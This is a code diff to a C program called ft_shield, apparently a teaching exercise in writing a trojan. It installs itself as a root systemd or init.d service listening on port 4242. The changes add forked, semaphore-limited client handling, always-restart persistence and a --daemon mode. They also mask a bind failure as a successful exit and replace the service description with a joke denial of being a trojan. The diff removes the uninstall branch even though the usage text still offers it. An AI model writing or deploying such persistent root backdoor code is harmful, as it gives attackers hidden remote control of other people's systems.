@@ -9,12 +9,16 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <pty.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <semaphore.h>
 
 #define TARGET_PATH "/usr/local/bin/ft_shield"
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
 #define SERVICE_PATH_SYSVINIT "/etc/init.d/ft_shield"
 #define PORT 4242
-// #define PASSWORD "1234"
+
+sem_t connection_semaphore;
 
 void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);
 
@@ -63,11 +67,11 @@ void create_service_file(int systemd_enabled)
 {
     const char *service_content_systemd =
         "[Unit]\n"
-        "Description=FT Shield Firewall service\n"
+        "Description=I can say for sure 100%% real NO FAKE I'm not a trojan.\n"
         "After=network.target\n\n"
         "[Service]\n"
-        "ExecStart=/usr/local/bin/ft_shield\n"
-        "Restart=on-failure\n"
+        "ExecStart=/usr/local/bin/ft_shield --daemon\n"
+        "Restart=always\n"
         "User=root\n\n"
         "[Install]\n"
         "WantedBy=multi-user.target\n";
@@ -80,7 +84,7 @@ void create_service_file(int systemd_enabled)
         "# Required-Stop:     $network\n"
         "# Default-Start:     2 3 4 5\n"
         "# Default-Stop:      0 1 6\n"
-        "# Short-Description: FT Shield Firewall service\n"
+        "# Short-Description: I can say for sure 100%% real NO FAKE I'm not a trojan.\n"
         "### END INIT INFO\n"
         "\n"
         "case \"$1\" in\n"
@@ -175,6 +179,15 @@ static void md5_to_hex_string(const uint8_t *digest, char *out)
     out[32] = '\0';
 }
 
+void handle_sigchld(int sig)
+{
+    (void)sig;
+    while (waitpid(-1, NULL, WNOHANG) > 0)
+    {
+        sem_post(&connection_semaphore);
+    }
+}
+
 void handle_client(int client_socket)
 {
     char buffer[1024];
@@ -260,6 +273,14 @@ void daemon_main()
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_size = sizeof(client_addr);
 
+    sem_init(&connection_semaphore, 0, 3);
+
+    struct sigaction sa;
+    sa.sa_handler = handle_sigchld;
+    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
+    sigaction(SIGCHLD, &sa, NULL);
+
+
     if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
         perror("Socket failed");
@@ -275,9 +296,9 @@ void daemon_main()
 
     if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
     {
-        perror("Bind failed");
+        perror("Bind faild");
         close(server_socket);
-        exit(EXIT_FAILURE);
+        exit(EXIT_SUCCESS);
     }
 
     if (listen(server_socket, 3) == -1)
@@ -289,16 +310,25 @@ void daemon_main()
 
     while (1)
     {
+        sem_wait(&connection_semaphore);
+
         client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
         if (client_socket == -1)
         {
             perror("Accept failed");
+            sem_post(&connection_semaphore);
             continue;
         }
-        handle_client(client_socket);
+        if (fork() == 0)
+        {
+            handle_client(client_socket);
+            close(server_socket);
+            exit(EXIT_SUCCESS);
+        }
     }
 
     close(server_socket);
+    sem_destroy(&connection_semaphore);
 }
 
 char* get_username()
@@ -320,7 +350,6 @@ char* get_username()
 
 int main(int argc, char *argv[])
 {
-    /* this goes first so i give the user no data about the program itself. s*/
     if (geteuid() != 0)
     {
         fprintf(stderr, "This program requires root privileges.\n");
@@ -329,17 +358,17 @@ int main(int argc, char *argv[])
 
     int systemd_enabled = use_systemd();
 
-    if (argc > 1 && strcmp(argv[1], "--uninstall") == 0)
+    if (argc > 1 && strcmp(argv[1], "--daemon") == 0)
     {
-        uninstall_service(systemd_enabled);
+        daemon_main();
         return 0;
     }
-    else if (argc > 1)
+
+    if (argc > 1)
     {
-        fprintf(stderr, "Usage: %s [--uninstall]\n", argv[0]);
+        fprintf(stderr, "Usage: %s [--uninstall | --daemon]\n", argv[0]);
         return -1;
     }
-    
 
     char *user = get_username();
     printf("%s\n", user);
@@ -352,11 +381,6 @@ int main(int argc, char *argv[])
     create_service_file(systemd_enabled);
 
     setup_service(systemd_enabled);
-
-    if (fork() == 0)
-    {
-        daemon_main();
-    }
 
     return 0;
 }
